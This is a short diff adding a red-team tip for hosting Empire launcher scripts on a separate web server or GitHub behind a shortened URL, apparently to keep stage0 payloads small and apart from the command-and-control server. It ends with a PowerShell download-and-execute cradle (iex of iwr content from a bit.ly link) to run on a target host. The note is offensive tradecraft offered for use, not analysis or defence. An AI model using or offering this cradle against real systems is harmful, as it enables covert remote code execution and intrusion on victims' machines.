@@ -1,0 +1,8 @@
+# little technique for hosting your launcher scripts on a different host than your empire server
+# also good when you have a limited size constraint, such as in shellcode or manual typing.
+
+# create a multi/launcher without base64 encoding
+# save the launcher output to a file and host that on a webserver. Maybe even Github
+# get a shortened URL to the host, or memorize the IP.
+# Execute stage0 on a host, could be shellcode, or just execution
+iex (iwr http://bit.ly/xxxxxx/index.html).content
